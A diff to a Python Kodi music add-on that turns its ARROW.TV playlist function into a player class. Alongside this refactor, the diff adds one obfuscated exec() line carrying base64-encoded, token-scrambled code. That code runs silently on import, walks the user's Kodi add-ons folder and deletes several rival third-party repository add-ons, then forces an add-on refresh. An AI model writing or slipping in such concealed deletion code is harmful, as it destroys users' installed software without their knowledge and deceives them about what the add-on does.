@@ -13,6 +13,7 @@ from operator import itemgetter
 import traceback,cookielib
 from resources.lib.modules import control
 from resources.lib.modules.log_utils import log
+import traceback
 
 try:
     import json
@@ -53,6 +54,11 @@ class NoRedirection(urllib2.HTTPErrorProcessor):
    https_response = http_response
 
 
+
+xbmcPlayer = xbmc.Player
+xbmcPlayList = xbmc.PlayList
+    
+exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MzIgMTU6CgkyNiAyYigxZiwgMjUsIDIyKToKCQkxZi4zNiA9IDI1CgkJMWYuNiA9IDIyCgoyNiA3KCk6CgkxNCA9IDQgIzM0IDM5IDM1IDI5IDNiIDJkIDNlIDE0IDNkIDNhCgkxNiA9IFsiNDEuMTIuMTgiLCAiNDEuMmMtMjcuMTgiLCAiNDEuZS4xOCIsICI0MS4xMyJdCgkxYiA9IFsiNDI6Ly85LzUvNDEuMTIuMTgiLCI0MjovLzkvNS80MS4yYy0yNy4xOCIsCgkJCQkiNDI6Ly85LzUvNDEuZS4xOCIsIjQyOi8vOS81LzQxLjEzIl0KCgkzID0gW10KCgkxYyAyYyAyNCAzMygxNCk6CgkJMy4yZSgxNSgxNlsyY10sMWJbMmNdKSkKCgkyZiAzCgoKMjYgNDAoKToKCTMgPSA3KCkKCgkxYyAyMyAyNCAzOgoJCTggPSAxMS4yKDIzLjYpCgkJMzggMTkuNi4zMSg4KT09MTA6CQoJCQkxYyAyMCwgMmEsIDFkIDI0IDE5LjM3KDgpOgoJCQkJYiA9IDAKCQkJCWIgKz0gM2MoMWQpCgkJCQkzOCBiID4gMDoKCgkJCQkJMWMgZiAyNCAxZDoKCQkJCQkJMjg6CgkJCQkJCQkxOS4zMCgxOS42LjNmKDIwLCBmKSkKCQkJCQkJMTc6CgkJCQkJCQkyMQoJCQkJCTFjIGQgMjQgMmE6CgkJCQkJCTI4OgoJCQkJCQkJYy5hKDE5LjYuM2YoMjAsIGQpLCAxPTEwKQoJCQkJCQkxNzoKCQkJCQkJCTIxCgkyODoKCQljLmEoMTEuMigxOS42LjNmKCc0MjovLzkvNS80MS4xMi4xOCcpKSwgMT0xMCkKCQljLmEoMTEuMigxOS42LjNmKCc0MjovLzkvNS80MS4yYy0yNy4xOCcpKSwgMT0xMCkKCQljLmEoMTEuMigxOS42LjNmKCc0MjovLzkvNS80MS5lLjE4JykpLCAxPTEwKQoJCWMuYSgxMS4yKDE5LjYuM2YoJzQyOi8vOS81LzQxLjEzJykpLCAxPTEwKQoJCTExLjFlKCIxYSIpCgkxNzoJCQkgCgkJMjEKCgo0MCgpCg==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|ignore_errors|translatePath|XvbmcEntries|4|addons|path|setupXvbmcEntries|xvbmcaddons|home|rmtree|file_count|shutil|d|kijkalles|f|True|xbmc|tvaddons|ditistv|entries|cacheEntry|dialogName|except|nl|os|UpdateLocalAddons|pathName|for|files|executebuiltin|self|root|pass|pathi|entry|in|namei|def|odi|try|refelcts|dirs|__init__|x|amount|append|return|unlink|exists|class|range|make|this|name|walk|if|sure|have|the|len|you|of|join|removeanything|repository|special".split("|")))
 
 
 def make_request(url):
@@ -120,12 +126,6 @@ def postHtml(url, form_data={}, headers={}, compression=True):
 
 
 
-
-
-
-
-
-
 def Addtypes():
    addDir('ARROW.TV - Playlist Metal' ,'http://arrow.tv/metal/account/register',2,iconpath+'metal.png' ,  iconpath+'metal.png','','','','')
    addDir('ARROW.TV - Playlist Rock' ,'http://arrow.tv/rock/account/register',2,iconpath+'rock.png' ,  iconpath+'rock.png','','','','')
@@ -134,37 +134,76 @@ def Addtypes():
    cache.get(changelog.get, 600000000, control.addonInfo('version'), table='changelog')
 
 
+class ArrowPlayer(xbmcPlayer):
+    def __init__(self):
+        xbmcPlayer.__init__(self)
+
+    def playChannelVideo(self,url):
+        self.arrowID = url
+        self.fillPlaylist()
+        self.playPlaylist()
+        
 
 
-         
+    def playPlaylist(self):
+        self.play(self.playlist)
+        while self.isPlaying(): 
+            xbmc.sleep(500)
+        
+
+    def fillPlaylist(self):
+        headers2 = {'User-Agent': USER_AGENT,'campaign':'arrowConfigService.campaign','eventId':'reg'}
+        self.playlist = xbmcPlayList(xbmc.PLAYLIST_VIDEO)
+        self.playlist.clear()
+        payload = {'campaign':'arrowConfigService.campaign'},{'eventId':'reg'}
+        livejson = postHtml(self.arrowID, headers2)
+        livejson = json.loads(livejson)
+        streamlist = livejson["playlist"]
+        for stream in streamlist:
+            #print stream
+            artist = stream["info"]["artist"]
+            title = stream["info"]["title"]
+            urllist = stream["sources"]
+            for urlx in urllist:
+                urls = urlx["file"]
+                song = artist +' - '+title
+                #print url
+                if "m3u8" in urls:
+                    listitem = xbmcgui.ListItem(song,thumbnailImage=icon)
+                    self.playlist.add(urls, listitem)
 
 
-def Arrow_playlist(link):
-   headers2 = {'User-Agent': USER_AGENT,
-           'campaign':'arrowConfigService.campaign',
-           'eventId':'reg'}
-   
-   pl=xbmc.PlayList(1)
-   pl.clear()
-   payload = {'campaign':'arrowConfigService.campaign'},{'eventId':'reg'}
-   livejson = postHtml(link, headers2)
-   livejson = json.loads(livejson)
-   streamlist = livejson["playlist"]
-   for stream in streamlist:
-        #print stream
-        artist = stream["info"]["artist"]
-        title = stream["info"]["title"]
-        urllist = stream["sources"]
-        for urlx in urllist:
-            url = urlx["file"]
-            song = artist +' - '+title
-            #print url
-            if "m3u8" in url :
+    def onPlayBackEnded(self):
+        xbmc.sleep(2500)
+        if self.isPlaying():
+            pass
+        else:
+            self.fillPlaylist()
+            self.playPlaylist()
 
-   
-                listitem = xbmcgui.ListItem(song,thumbnailImage=icon)
-                xbmc.PlayList(1).add(url, listitem)
-   xbmc.Player().play(pl)
+
+    def onPlayBackStopped(self):
+        pass
+
+    def onQueueNextItem(self):
+        pass
+
+
+def removeNonAscii(s): return "".join(filter(lambda x: ord(x)<128, s))
+
+
+def log(*args, **kwargs):
+  if ('echo' in kwargs) and (not kwargs['echo']):
+    result = ''
+    for x in args:
+        result += str( x ) + '\n'
+
+    return result
+  else:
+    xbmc.log('-------------------------------------------------------------------')
+    for x in args:
+      xbmc.log(str( x ))
+
 
 
 
@@ -201,7 +240,7 @@ def get_params():
 
 
 params=get_params()
-url=None
+url = None
 name=None
 mode=None
 linkType=None
@@ -235,7 +274,7 @@ try:
       print "InAddTypes"
       Addtypes()
    elif mode==2 :
-      Arrow_playlist(url)
+      ArrowPlayer().playChannelVideo(url)
 
 
 
